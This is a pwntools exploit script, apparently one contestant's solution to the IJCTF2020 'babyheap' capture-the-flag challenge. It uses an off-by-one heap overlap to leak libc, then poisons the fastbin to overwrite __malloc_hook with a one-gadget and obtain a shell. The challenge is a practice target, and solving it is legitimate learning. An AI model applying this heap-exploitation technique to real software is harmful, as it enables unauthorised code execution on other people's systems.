#!/usr/bin/python
from pwn import *

HOST = '35.186.153.116'
PORT = 7001
chdir = '/MOUNT/contest/IJCTF2020-master/pwn/babyheap/'
config = {
        'elf': chdir + 'babyheap',
        'libc': chdir + 'libc6_2.23-0ubuntu10_amd64.so',
        'HOST': HOST,
        'PORT': PORT,
        }

INPUT_PROMPT = None

def _malloc(r, sz, data):
	r.sendlineafter('>','1')
	r.sendlineafter('size:',str(sz))
	r.sendafter('data:',data)

def _free(r, idx):
	r.sendlineafter('>','2')
	r.sendlineafter('idx:',str(idx))

def _print(r, idx):
	r.sendlineafter('>','3')
	r.sendlineafter('idx:',str(idx))

def exploit(r):
	_malloc(r,0x3f0,"A"*0x3f0)	# 0
	_malloc(r,0x30,"B"*0x30)	# 1
	_malloc(r,0x60,"C"*0x60)	# 2
	_malloc(r,0x3f0,"D"*0x3f0)	# 3
	_malloc(r,0x60,"E"*0x60)	# 4
	
	_free(r,2)
	_malloc(r,0x68,"c"*0x68) # 2
	for i in range(0x65,0x5f,-1):
		_free(r,2)
		_malloc(r,0x68,"c"*i+p16(0x4b0)) # 2
	_free(r,0)
	_free(r,3) # Trigger overlapping chunks

	_malloc(r,0x3f0,"a"*0x3f0) # 0
	_print(r,1)
	r.recvuntil('data: ')
	leak = u64(r.recvn(6).ljust(8,'\x00'))
	libc.address = leak - 0x3c4b78
	oneshot = libc.address + 0xf02a4
	log.info("Leak Addr: {:#x}".format(leak))
	log.info("Libc Addr: {:#x}".format(libc.address))

	_free(r,4) # fastbin[0x70] -> 4
	_free(r,2) # fastbin[0x70] -> 2 -> 4

	_malloc(r,0x50,"b"*0x40 + p64(libc.symbols['__malloc_hook']-0x23) + p64(0))
	
	for i in range(0x38+6,0x38-1,-1):
		_free(r,1)
		data = "b"*i + "\x71"
		data += "\x00" * (0x50 - len(data))
		_malloc(r,0x50, data)
	
	_malloc(r,0x60,"d"*0x60) # fastbin[0x70] -> __malloc_hook
	_malloc(r,0x60,"\x90"*0x13+p64(oneshot)+"\x00"*(0x60-0x13-0x8))
	_malloc(r,0x20,"a"*0x20)

	r.interactive()

# ptrs:0x55eadf91f040
if __name__ == '__main__':
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    context.log_level = 'debug'

    if len(sys.argv) > 1:
        r = remote(config["HOST"], config["PORT"])
    else:
        context.terminal=['tmux', 'splitw', '-h']
        r = process(e.path, env={'LD_PRELOAD':config['libc']})
        
        gdb.attach(r, gdbscript='''
        	b *(0xa24+0x137)
        	b *(process+171)
    	''')
    exploit(r)